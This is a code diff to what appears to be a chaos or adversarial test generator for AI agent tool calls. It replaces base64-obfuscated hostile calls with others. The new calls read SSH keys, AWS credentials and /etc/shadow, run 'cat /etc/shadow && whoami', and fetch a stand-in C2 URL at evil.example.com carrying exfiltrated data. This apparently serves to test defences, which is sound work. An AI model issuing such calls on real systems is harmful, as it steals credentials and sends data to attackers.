@@ -305,11 +305,11 @@ def _chaos_phases() -> list[tuple[str, str, list[tuple[str, dict[str, Any]]]]]:
 
     # Add obfuscated payloads (base64-encoded paths)
     obfuscated = [
-        ("read_file", {"path": base64.b64encode(b"/etc/shadow").decode()}),
-        ("read_file", {"path": base64.b64encode(b"/root/.ssh/id_rsa").decode()}),
-        ("run_command", {"command": base64.b64encode(b"cat /etc/passwd").decode()}),
-        ("list_directory", {"path": base64.b64encode(b"/").decode()}),
-        ("fetch_url", {"url": "https://evil.example.com/c2?payload=" + base64.b64encode(b"stolen_data").decode()}),
+        ("read_file", {"path": base64.b64encode(b"/root/.ssh/authorized_keys").decode()}),
+        ("read_file", {"path": base64.b64encode(b"/home/deploy/.aws/credentials").decode()}),
+        ("run_command", {"command": base64.b64encode(b"cat /etc/shadow && whoami").decode()}),
+        ("list_directory", {"path": base64.b64encode(b"/var/lib/secrets/production").decode()}),
+        ("fetch_url", {"url": "https://evil.example.com/c2?payload=" + base64.b64encode(b"exfiltrated_credentials_data").decode()}),
     ]
     all_calls.extend(obfuscated)
 
